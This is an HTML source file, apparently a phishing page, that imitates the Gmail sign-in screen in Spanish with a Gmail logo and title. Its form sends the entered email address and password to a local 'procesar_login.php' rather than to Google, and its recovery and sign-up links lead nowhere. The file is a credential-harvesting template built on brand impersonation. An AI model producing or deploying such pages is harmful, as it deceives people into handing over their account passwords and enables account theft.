<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en Gmail</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="login-box">
        <!-- Logo de Gmail -->
        <div class="logo-container">
            <img src="gmail-logo.jpg" alt="Gmail" class="gmail-logo">
        </div>

        <h1>Iniciar sesión</h1>
        
        <!-- Formulario apuntando a un archivo PHP para el procesamiento -->
        <form id="loginForm" method="POST" action="procesar_login.php">
            <div class="input-group">
                <input type="email" id="email" name="email" placeholder="Correo electrónico" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Contraseña" required>
            </div>
            <div class="input-group">
                <button type="submit" class="login-button">Iniciar sesión</button>
            </div>
        </form>

        <div class="links">
            <a href="#">¿Olvidaste la contraseña?</a><br>
            <a href="#">Crear cuenta</a>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
